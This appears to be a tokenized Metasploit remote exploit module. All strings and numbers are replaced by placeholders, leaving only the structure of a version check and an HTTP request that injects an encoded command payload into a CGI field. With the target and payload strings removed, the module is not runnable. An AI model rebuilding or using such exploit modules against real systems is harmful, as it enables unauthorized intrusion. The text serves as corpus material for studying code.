require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = ExcellentRanking include Msf :: Exploit :: Remote :: HttpClient def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> , <str> ] , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > false , <str> = > { <str> = > <int> , <str> = > true , <str> = > { <str> = > <str> , <str> = > <str> , <str> = > <str> } } , <str> = > <str> , <str> = > [ [ <str> , { } ] ] , <str> = > ARCH_CMD , <str> = > <str> , <str> = > <int> ) ) register_options ( [ OptString . new ( <str> , [ true , <str> , <str> ] ) , ] , self . class ) end def check uri = normalize_uri ( target_uri . path . to_s , <str> ) res = send_request_raw ( <str> = > uri ) if res and res . body =~ <str> vprint_good ( <str> ) return Exploit :: CheckCode :: Appears end Exploit :: CheckCode :: Safe end def exploit uri = normalize_uri ( target_uri . path . to_s , <str> ) vprint_status ( <str> uri <str> ) send_request_cgi ( { <str> = > <str> , <str> = > uri , <str> = > { <str> = > <str> } , <str> = > { <str> = > <str> , <str> = > <str> rand_text_alphanumeric ( <int> ) <str> payload . encoded <str> , <str> = > rand_text_alphanumeric ( <int> ) , <str> = > rand_text_alphanumeric ( <int> ) , <str> = > rand_text_alphanumeric ( <int> ) , <str> = > <str> } } ) end end 
